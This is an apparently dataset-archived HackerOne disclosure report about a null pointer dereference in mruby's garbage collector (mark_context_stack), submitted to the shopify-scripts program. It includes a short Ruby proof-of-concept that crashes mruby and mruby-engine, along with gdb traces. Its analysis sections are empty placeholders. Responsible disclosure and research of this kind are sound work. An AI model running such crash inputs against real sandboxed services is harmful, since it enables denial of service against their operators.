---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '208526'
original_report_id: '208526'
title: Null pointer dereference in mark_context_stack
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2017-02-24T02:09:01.817Z'
disclosed_at: '2017-03-14T21:12:54.560Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Null pointer dereference in mark_context_stack

## Metadata

- HackerOne Report ID: 208526
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-03-14T21:12:54.560Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The following code causes a segfault in mruby and mruby-engine:

    class A < def to_str
        0 and s@e--->{}
        rescue ""
        end
    end

mruby crashes due to a null pointer dereference in `mark_context_stack` (gc.c:554):

    553│     if (!mrb_immediate_p(v)) {
    554├>      if (mrb_basic_ptr(v)->tt == MRB_TT_FREE) {
    555│         c->stbase[i] = mrb_nil_value();

(gdb) print v
$1 = {value = {f = 0, p = 0x0, i = 0, sym = 0}, tt = 7013872}
(gdb) print mrb_basic_ptr(v)
$2 = (struct RBasic *) 0x0

mruby-engine appears to crash one line earlier, when returning from `mrb_immediate_p` (boxing_word.h:90):

     89│   }
     90├>  return o.value.bp->tt;
     91│ }
     
In this case, the variable `v` (the `o` parameter of `mrb_immediate_p`, which itself shows as optimized out on the test platform) was:

(gdb) print v
$1 = {value = {p = 0x100000002, {i_flag = 0, i = 2147483649}, {sym_flag = 2, sym = 1}, 
bp = 0x100000002, fp = 0x100000002, vp = 0x100000002}, w = 4294967298}

 
Test platform:
Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)

mruby-engine SHA:  09be20e67888b20bebf9b0588bc3cbec7f55325f
mruby (submodule) SHA: a9f7b41219810fdbe0cffa872051cd091fc070ac

Thank you,
Dinko Galetic
Denis Kasak

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
